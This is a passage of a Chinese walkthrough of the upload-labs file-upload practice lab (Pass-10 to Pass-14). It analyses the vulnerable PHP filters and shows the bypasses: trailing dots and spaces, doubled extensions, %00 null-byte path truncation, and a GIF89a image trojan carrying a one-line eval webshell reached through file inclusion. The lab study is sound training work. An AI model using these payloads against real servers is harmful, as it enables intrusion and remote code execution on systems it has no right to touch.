class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码与前后的关卡中的源码都类似，甚至就是最全面的版本，因此，本关的解法也适用于前面几关。</p></li><li><p>再次统一分析一下这段关键代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line"><span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line"><span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line"><span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><p>我们需要知道，文件名末尾的点与空格都是无效的，但是他们却会影响文件的匹配，比如后缀名 <code>.php</code> 与 <code>.php.</code> 就不匹配，但是 <code>.php.</code> 在 Windows 中执行时却因为自动忽略而变成 <code>.php</code> 。因此，为避免空字符突破黑名单的漏洞，程序需要对接收到的文件名做处理，以让黑名单中的后缀名不管怎么伪装总能被匹配到。</p><p>第一句话就是负责删除文件名末尾的点，删除了末尾无效的点之后，文件名中最后一个点后面所接的就是后缀名了，因此：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br></pre></td></tr></table></figure><p>该语句就是获取后缀名，通过 <code>strtolower()</code> 方法将所有字母小写，这样就屏蔽了大小写漏洞。值得注意的是 <code>::$DATA</code> ，在 Windows 中会将 <code>::$DATA</code> 之后的数据当作文件流，而保持 <code>::$DATA</code> 前的文件名，因此如果文件名为 <code>h-t-m.php::$DATAmyr520</code> ，就会等价于 <code>h-t-m.php</code> 。因此，第四句话的作用就是将他删去再进行匹配。最后一句话即如注释所示，删去空白字符。因为第一句话只是删除了点，而现在空白字符也删去了。那么，岂不是没有漏洞了？</p></li><li><p>显然不是，上述代码虽然看似完善，但实际上忽略了一个巨大的问题。第一句只能删除末尾的点，而不能删去空白字符，那么如果后缀是这种形式的：<code>.php.[].</code> （ <code>[]</code> 表示空白字符），那么第一句话将只能删去最后的那个点，在经过第四句后缀就变成了 <code>.php.</code> ，也就是说还是会剩下一个点。而这就是我们要利用的漏洞，漏洞出现的原因就是没有循环验证。</p></li></ul><h3 id="突破限制-11">突破限制</h3><ul><li><p>需要备好的木马文件的后缀名修改为 <code>.php.[].</code> （ <code>[]</code> 表示空格），当然这无法再 Windows 下完成，因此我们需要抓包修改。</p></li><li><p>在 <code>BurpSuite</code> 中打开靶机并上传木马文件，在文件后缀名之后加上 <code>.[].</code> （ <code>[]</code> 表示空格）。</p><img src="https://bu.dusays.com/2022/05/09/6278b05cb6131.webp" alt="" style="zoom:75%"></li><li><p><code>Forward</code> 之后文件上传成功！</p><img src="https://bu.dusays.com/2022/05/09/6278b00bda517.webp" alt="" style="zoom:75%"></li></ul><h3 id="夺旗-9">夺旗</h3><ul><li><p>蚁剑连接</p><img src="https://bu.dusays.com/2022/05/09/6278b00c92ed0.webp" alt="" style="zoom:75%"><p>如果上传之后直接获取文件 URL 可能后缀名后会带点，由于我们执行文件时点是被系统忽略的，因此蚁剑连接时记得末尾不要带点！</p></li><li><p>根目录夺旗</p><img src="https://bu.dusays.com/2022/05/09/6278b00d7db69.webp" alt="" style="zoom:75%"></li></ul><h2 id="Pass-11">Pass-11</h2><h3 id="启动靶机-18">启动靶机</h3><ul><li><p>上一关算是一个BOSS，这关总得不太一样吧，专题训练过半🎊</p><img src="https://bu.dusays.com/2022/05/11/627bd7fdc6ff6.webp" alt="" style="zoom:75%"></li></ul><h3 id="研究界面-8">研究界面</h3><ul><li><p>直接查看源码，重点在这句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = str_ireplace(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br></pre></td></tr></table></figure><p>这句将文件名中与黑名单匹配的部分换为空，即使黑名单中的文件无法被解析。</p></li><li><p>但是，就这么一句一次只能替换当前存在的黑名单字符，我把后缀名换成 <code>.pphphp</code> 被替换后还剩下 <code>.php</code> ，这不是正好。甚至可以吧后缀名改成 <code>.pphpphpphpphpphpphphp</code> ，照样正好。</p></li></ul><h3 id="突破限制-12">突破限制</h3><ul><li><p>那就直接将木马文件后缀名改成 <code>.pphphp</code></p><img src="https://bu.dusays.com/2022/05/11/627bd7ff02968.webp" alt="" style="zoom:75%"></li><li><p>上传，成功！</p><img src="https://bu.dusays.com/2022/05/11/627bd801860ac.webp" alt="" style="zoom:75%"></li></ul><h3 id="夺旗-10">夺旗</h3><ul><li><p>蚁剑连接</p><img src="https://bu.dusays.com/2022/05/11/627bd802bc6c1.webp" alt="" style="zoom:75%"></li><li><p>根目录夺旗</p><img src="https://bu.dusays.com/2022/05/11/627bd804225c5.webp" alt="" style="zoom:75%"></li></ul><h2 id="Pass-12">Pass-12</h2><h3 id="启动靶机-19">启动靶机</h3><ul><li><p>再次重新开始！</p><img src="https://bu.dusays.com/2022/05/12/627d002f435a7.webp" alt="" style="zoom:75%"></li></ul><h3 id="研究页面-5">研究页面</h3><ul><li><p>先看一下提示：</p><img src="https://bu.dusays.com/2022/05/12/627d003178298.webp" alt="" style="zoom:75%"><p>“上传路径可控”，挺好，就是不太懂怎么个可控法。</p></li><li><p>于是继续查看一下源码，代码不长，因此这里完整梳理一遍：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>可以看出，这次文件过滤不再采用黑名单，而是用白名单将可上传文件限制为 <code>.jpg</code> 、 <code>.png</code> 、 <code>.gif</code> 三种格式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br></pre></td></tr></table></figure></li><li><p>紧接着老长的一句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = substr(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p><code>strrpos()</code> 返回第二个参数（<code>.</code>）在第一个参数中（文件名）最后一次出现的位置，<code>substr()</code> 则返回从第二个参数（索引）之后的字符串。 因此，这句语句其实就是截取文件的后缀名。</p><p>由于是白名单，后缀名截取结果只要不在白名单中均无效，因此，前面关卡中在后缀名后添加无效的点的小伎俩肯定是不能用了。</p></li><li><p>接下来这句其实就是用 <code>$temp_file</code> 变量引用上传时生成的临时文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br></pre></td></tr></table></figure><p>文件的上传实际上就是将临时文件放入服务器指定位置，也就是后面在 <code>if</code> 语句中完成的操作，上传成功则返回 <code>true</code> ，否则返回 <code>false</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)</span><br></pre></td></tr></table></figure></li><li><p>而在上述两个语句之间的这句则是本关的重点：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br></pre></td></tr></table></figure><p><code>rand(10, 99)</code> 返回一个 <code>10</code> ~ <code>99</code> 之间的随机整数，<code>date(&quot;YmdHis&quot;)</code> 返回代表当前时间的一串整数，其中 <code>YmdHis</code> 分别表示年月日时分秒。后面又衔接上了点与后缀名，因此，<code>&quot;/&quot;</code> 之后表示以随机数加时间戳的形式重命名文件。上传一个图片测试一下：</p><img src="https://bu.dusays.com/2022/05/12/627d00323885f.webp" alt="" style="zoom:75%"> <img src="https://bu.dusays.com/2022/05/12/627d003a8f712.webp" alt="" style="zoom:75%"><p>而代码中 <code>&quot;/&quot;</code> 之前的 <code>$_GET['save_path']</code> 则表示指定的上传路径，默认上传路径依然是 <code>upload</code> 目录下。值得注意的是，<code>save_path</code> 由 <code>GET</code> 方式上传，因此，我们可以在 URL 中指定文件的上传路径，而提示中的“上传路径可控”指的自然就是这个了！</p></li></ul><h3 id="突破限制-13">突破限制</h3><ul><li><p>既然可以修改上传路径，那么这对我们又有什么用呢？</p><p>在 URL 中，我们并不能输入所有的字符，而当我们需要表示一个特殊字符时，便需要对他进行编码。在之前的关卡中，我们的木马文件都使用了中文字符作为文件名，但实际使用时却用的是他的编码形式，一般形式为百分号后加二位十六进制数（Ascii）表示一个字符，而一个中文字符需要使用三个一般字符来表示：</p><blockquote><p>http://[靶机地址]/upload/木马.php</p><p>http://[靶机地址]/upload/%E6%9C%A8%E9%A9%AC.php</p></blockquote><p>在浏览器中打开时你会发现显示的依然是中文字符，那是因为浏览器会自动帮助我们解码。</p><p>而在这些编码中，就有一个特殊字符 <code>%00</code> 。在 C 语言的字符串中有一个 Ascii 值为零的特殊字符 <code>'\0'</code> ，一般用于表示字符串结束，而在这里，他也起相同作用。</p></li><li><p>依然注意这段关键代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br></pre></td></tr></table></figure><p>当我们上传一个 <code>jpg</code> 文件，并且指定的路径 <code>save_path</code> 为 <code>../muma.php%00</code> ，连之后就会变成 <code>../muma.php%00/[随机数].jpg</code> . 而这段字符串在 <code>%00</code> 就已经被截断了，因此原本将文件上传至 <code>jpg</code> 文件的语句就变成的将文件上传至 <code>muma.php</code> 文件中，因此，我们就可以入侵了。</p></li><li><p>有趣的是，这个漏洞<strong>只有</strong>在 <strong><code>magic_quotes_gpc</code></strong> 函数<strong>关闭</strong>的条件下才能实现，而这个函数默认情况下是开启的，且在 <strong>PHP 5.3.4</strong> 版本之后漏洞也已经被修复了。我们在 Pass-05 时获取过 <code>phpinfo()</code> ，虽然版本号为 5.2.17 是不错，但是很遗憾靶机的 <code>magic_quotes_gpc</code> 函数依然保持开启状态：</p><img src="https://bu.dusays.com/2022/05/12/627d003cd2d19.webp" alt="" style="zoom:75%"> <img src="https://bu.dusays.com/2022/05/12/627d00b00bbf5.webp" alt="" style="zoom:75%"><p>因此，虽然不太情愿，但本关依旧使用本地搭建的靶机。</p><p>不知道为什么我的 <code>PHP study</code> 一直无法下载 php 5.2.17 版本，因此我只能在 <a target="_blank" rel="noopener" href="https://www.php.net/releases/index.php">php 发布页</a> 下载了 php 5.2.10 版本，并且自行在 <code>php.ini</code> 配置文件中添加了关闭 <code>magic_quotes_gpc</code> 函数的配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">magic_quotes_gpc = Off</span><br></pre></td></tr></table></figure></li><li><p>准备好木马文件并且以 <code>.jpg</code> 结尾，暂时伪装成图片文件：</p><img src="https://bu.dusays.com/2022/05/12/627d003b2bc3d.webp" alt="" style="zoom:75%"></li><li><p>打开 <code>BurpSuite</code> 抓包，我们显然无法在文件上传之前直接在网页上修改路径内容，因此我们对报文进行修改。修改路径变量 <code>save_path</code> 为 <code>../h-t-m.php%00</code> ：</p><img src="https://bu.dusays.com/2022/05/12/627d003bf1fdf.webp" alt="" style="zoom:75%"></li><li><p><code>Forward</code> 之后，上传成功！</p><img src="https://bu.dusays.com/2022/05/12/627d00a0aca20.webp" alt="" style="zoom:75%"></li></ul><h3 id="夺旗-11">夺旗</h3><ul><li><p>蚁剑连接</p><img src="https://bu.dusays.com/2022/05/12/627d00a15e6fd.webp" alt="" style="zoom:75%"><p>注意我们依然只需要连接到php木马文件而不是图片文件，毕竟那些都已经被忽略了。</p></li><li><p>本地无旗可夺，看个目录解解馋吧</p><img src="https://bu.dusays.com/2022/05/12/627d00a240e4d.webp" alt="" style="zoom:75%"></li></ul><h2 id="Pass-13">Pass-13</h2><h3 id="启动靶机-20">启动靶机</h3><ul><li><p>再次回到起点</p><img src="https://bu.dusays.com/2022/05/12/627d00a330629.webp" alt="" style="zoom:75%"></li></ul><h3 id="研究页面-6">研究页面</h3><ul><li><p>本关与上一关几乎一致，唯一不同的地方在于源码中的这一句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br></pre></td></tr></table></figure><p>将上一关的 <code>$_GET[]</code> 换成了 <code>$_POST[]</code> ，代表了网页提交表单的两种方法。</p></li><li><p>关于两种方法的大致区别可以 <a target="_blank" rel="noopener" href="https://www.w3school.com.cn/tags/html_ref_httpmethods.asp">参考这里</a> ，在本关卡中的区别主要是<code>GET</code> 方法会自动解码，即把 <code>%00</code> 解码为对应的空字符，而 <code>POST</code> 方法则不会自动解码，他对百分号没有任何特殊感情。</p></li><li><p>既然不能直接传编码形式的，我们就只能原样传进去了，当然靠输入是肯定没办法输入进去空字符的，因此我们需要修改二进制的报文，直接输入空值！</p></li></ul><h3 id="突破限制-14">突破限制</h3><ul><li><p>打开 <code>BurpSuite</code> 上传上一关相同的文件（以 <code>.jpg</code> 后缀作为伪装的 php 木马文件），我们可以在 <code>Raw</code> 模式下编辑好路径，最后留下一个字符便于我们修改，这里预留一个 <code>'/'</code> 字符：</p><img src="https://bu.dusays.com/2022/05/12/627d00a3e831c.webp" alt="" style="zoom:75%"><p>在二进制（<code>Hex</code>）中找到对应字符，将其修改为 <code>00</code> 即可：</p><img src="https://bu.dusays.com/2022/05/12/627d00a5bad0c.webp" alt="" style="zoom:75%"> <img src="https://bu.dusays.com/2022/05/12/627d00a4bef7b.webp" alt="" style="zoom:75%"><p>当然也可以直接在 <code>Raw</code> 下输入 <code>../h-t-m.php%00</code> 并且右键解码即可：</p><img src="https://bu.dusays.com/2022/05/12/627d002e67375.webp" alt="" style="zoom:75%"></li><li><p>然后当然是 <code>Forward</code> 并且上传成功：</p><img src="https://bu.dusays.com/2022/05/12/627d002d1b56e.webp" alt="" style="zoom:75%"></li></ul><h3 id="夺旗-12">夺旗</h3><ul><li><p>蚁剑连接</p><img src="https://bu.dusays.com/2022/05/12/627d00300ecec.webp" alt="" style="zoom:75%"></li><li><p>依旧无旗可夺~浅看一下目录吧</p><img src="https://bu.dusays.com/2022/05/12/627d0030ba50b.webp" alt="" style="zoom:75%"></li></ul><h2 id="Pass-14">Pass-14</h2><h3 id="启动靶机-21">启动靶机</h3><ul><li><p>再次<s>回到</s>，哎界面变了：</p><img src="https://bu.dusays.com/2022/05/12/627d002d73bea.webp" alt="" style="zoom:75%"><p>欢迎进入图片马时代！</p></li></ul><h3 id="研究页面-7">研究页面</h3><ul><li><p>先查看提示：</p><img src="https://bu.dusays.com/2022/05/15/6280fa2a2ce14.webp" alt="" style="zoom:75%"><p>对图片的内容开头两个字节进行检查，意味着我们修改修改文件名，改改 <code>MIME</code> 是肯定不行了，他得是货真价实的图片文件了。</p></li><li><p>至于为什么只用检查文件开头两个字节就能判断文件是否为合法的图片文件，因为那块地方是文件头啊！比如 <code>.jpg</code> 的文件头字段就是 <code>FFD8FF</code> ，我们可以在 <code>VS code</code> 中使用 <code>hexdump for VSCode</code> 插件查看一张 <code>.jpg</code> 的图片：</p><img src="https://bu.dusays.com/2022/05/15/6280fa2c9d8a8.webp" alt="" style="zoom:75%"><p>而 <code>.png</code> 的文件头字段为 <code>89504E47</code> ，我们用同样的方法打开一个 <code>.png</code> 的图片即可验证：</p><img src="https://bu.dusays.com/2022/05/15/6280fa2f95b84.webp" alt="" style="zoom:75%"><p>而如果我们将 <code>.jpg</code> 后缀换成 <code>.png</code> 后缀再打开文件，会发现：</p><img src="https://bu.dusays.com/2022/05/15/6280fa2d54024.webp" alt="" style="zoom:75%"><p>文件头不会随后缀名的改变而改变，或者更加粗鲁地说，文件的真实类型就取决于文件头。因此，我们能做的，就是将木马内嵌到一个真实且合法的图片文件中，也就是所谓的<code>图片马</code>。</p></li><li><p>另外一个重要问题是，藏在图片中的木马如何才能运行起来。</p><p>在进入 Pass-14 时，作者给了三条注意事项，其中第二条就是针对这个问题：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2.使用文件包含漏洞能运行图片马中的恶意代码。</span><br></pre></td></tr></table></figure><p>也就是说，为了运行代码，靶机中预留了文件包含漏洞，同时这也意味着本关漏洞必须配合文件包含漏洞食用。</p></li><li><p>关于这是如何实现的，我们可以先看一下这段文件包含漏洞的代码：</p><blockquote><p>本关就是由于 BUU 上未知原因该代码打不开，所以切换至本地靶机。经测试 BUU 平台文件正常，因此这里挖个坑，日后有能力再来解答。</p><img src="https://bu.dusays.com/2022/05/15/6280fa40dae11.webp" alt="" style="zoom:75%"></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">header(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__file__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>header()</code> 方法作用就是传送 <code>HTML</code> 文档标头以告诉浏览器如何处理这个页面，参数内容表示页面内容为 <code>html</code>，编码为 <code>utf-8</code> 。</p><p>然后 <code>$file</code> 通过 <code>GET</code> 方法接收一个变量 <code>file</code> ，<code>isset()</code> 则用于判断是否非空。也就是说，如果接收到了数据，数据内容就会被 <code>include</code> ，而如果没有接收到，则会显示 PHP 中的一个常量 <code>__file__</code> 。</p></li><li><p>而所谓文件包含，就是让服务器执行程序时通过包含函数加载另一个文件中的代码并且执行。有 <code>include()</code> 、 <code>require()</code> 、<code>include_once()</code> 和 <code>require_once()</code> 四种，其中 <code>include()</code> 表示执行该语句时包含，而 <code>require()</code> 表示程序运行开始就包含，后面两种则分别表示前面两种的不重复包含版本，即文件中代码已被包含则不会再次包含。</p></li><li><p>本关中我们上传的图片马中就会包含一句话木马，而木马的激活需要让 PHP 代码被执行，靶机中预留的文件包含漏洞代码中就使用了 <code>include</code> 函数，因此就可以用文件包含的形式将我们上传的文件内容作为 PHP 代码执行。我们需要做的就是将上传的文件用 <code>GET</code> 方法传递给该漏洞文件的 <code>file</code> 变量，我们在前面关卡中也使用过 <code>GET</code> 方法，只需在 URL 后添加 <code>?file=[文件路径]</code> 即可传递。</p></li></ul><h3 id="突破限制-15">突破限制</h3><ul><li><p>首先构建图片马，可以采用两种方法，一种是将木马通过文本编辑器（或者命令行）写入图片文件，另一种则是在文本文件输入合法文件头，然后将木马代码直接放在文件头之后。</p></li><li><p>这里先解释第二种方法，为什么文本文件中可以直接存放文件头且合法，文本自身的文件头不起作用吗？</p><ul><li><p>在 Windows 中，我们保存一个文本文件的默认编码都是 <code>UTF-8</code> ，而当我们选择另存为时，会发现还可以选择其他几种编码：</p><p><img src="https://bu.dusays.com/2022/05/15/6280fa4251484.webp" alt="" style="zoom:25%"> <img src="https://bu.dusays.com/2022/05/15/6280fa4306154.webp" alt="" style="zoom:25%"></p><p>这几种编码的具体内容在这不作讨论，只需知道 <code>ANSI</code> 编码与 <code>UTF-8</code> 编码是没有文件头的。值得注意的是，<code>UTF-8 BOM</code> 中的 <code>BOM</code> 就是 <code>UTF-8</code> 的文件头的意思，据说之前 Windows 默认就是带文件头版本的 <code>UTF-8</code> 编码，这里不做考证，如遇到问题修改为 <code>ANSI</code> 编码即可。</p><p>此外，为明确基本概念，我们还需要知道这里的 <code>ANSI</code> 编码并不是意味着使用一种叫 <code>ANSI</code> 的编码，而是根据系统环境为我们选择特定的编码。如图，用记事本打开一张图片，编码就默认为 <code>ANSI</code> ：</p><img src="https://bu.dusays.com/2022/05/15/6280fa43afbe7.webp" alt="" style="zoom:75%"><p>当然实际编码为 <code>GBK</code> ，因为我的电脑是简体中文版的。</p></li><li><p>因此，我们直接编辑一个只含有文件头加 PHP 代码的文本文件。合法的文件头的十六进制数值有三种，<code>.jpg</code> 的 <code>FFD8FF</code> ，<code>.png</code> 的 <code>89504E47</code> 以及 <code>.gif</code> 的 <code>47494638</code> 。可以在 <code>UltraEdit</code> 的十六进制模式下直接将文件头值写入，当然并不建议这样做，既然选择直接构建文本，直接输入文件头数值对应的字符不就好了。</p></li><li><p>话虽这么说，就像前面所看到的，数值对应的字符实际上我们并不能直接输入：</p><img src="https://bu.dusays.com/2022/05/15/6280fa2f95b84.webp" alt="" style="zoom:75%"> <img src="https://bu.dusays.com/2022/05/15/6280fa2c9d8a8.webp" alt="" style="zoom:75%"><p>点表示无法显示的字符，也就是说 <code>.png</code> 和 <code>.jpg</code> 文件显然不能直接输入字符完成了。但是还有一个“友好”的格式：<code>.gif</code></p><img src="https://bu.dusays.com/2022/05/15/6280fa4193e68.webp" alt="" style="zoom:75%"><p>可以看到，他的文件头的字符就是 <code>GIF89a</code> ，因此我们的文本内容可以直接为 <code>GIF89a &lt;?php @eval($_POST[&quot;h-t-m&quot;]);?&gt;</code> 。为了方便查看木马执行情况，在一句话木马中我们加入 <code>phpinfo();</code> 用于在页面中显示 PHP 环境信息，也就是 <code>GIF89a &lt;?php @eval($_POST[&quot;h-t-m&quot;]);phpinfo();?&gt;</code> .</p></li><li><p>只要编码正确，后缀名他又不检查，因此，我们的文件直接使用 <code>.php</code> 后缀也没事：</p><img src="https://bu.dusays.com/2022/05/15/6280fa445a84f.webp" alt="" style="zoom:75%"><p>显然我的 PHP 文件已经进入编译器时代了（指图标）。</p></li><li><p>上传文件，完成！</p><img src="https://bu.dusays.com/2022/05/15/6280fa44f223b.webp" alt="" style="zoom:75%"><p>可以看到文件已经被识别为 GIF 文件并且重命名好放在 <code>upload</code> 目录下了：</p><img src="https://bu.dusays.com/2022/05/15/6280fa459ee23.webp" alt="" style="zoom:75%"></li></ul></li><li><p>不急，再讨论一下第一种方法，把代码放入图片文件中。</p><ul><li><p>理论上只需要在记事本中打开并添加代码即可。使用记事本打开图像时，他实际上并不能正确识别如图像等非文本文件，记事本只是简单地将字节流视为 <code>ANSI</code> 